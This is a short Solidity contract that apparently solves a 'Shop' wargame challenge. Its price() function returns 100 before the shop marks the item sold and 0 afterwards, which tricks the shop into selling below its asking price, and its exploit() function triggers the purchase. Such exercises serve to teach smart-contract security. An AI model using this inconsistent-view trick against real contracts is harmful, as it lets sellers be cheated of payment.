// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IBuyer} from "./interface/IBuyer.sol";
import {Shop} from "./Shop.sol";

contract Buyer is IBuyer {
    function price() external view returns (uint256) {
        return Shop(msg.sender).isSold() ? 0 : 100;
    }

    function exploit(Shop shop) public {
        shop.buy();
    }
}
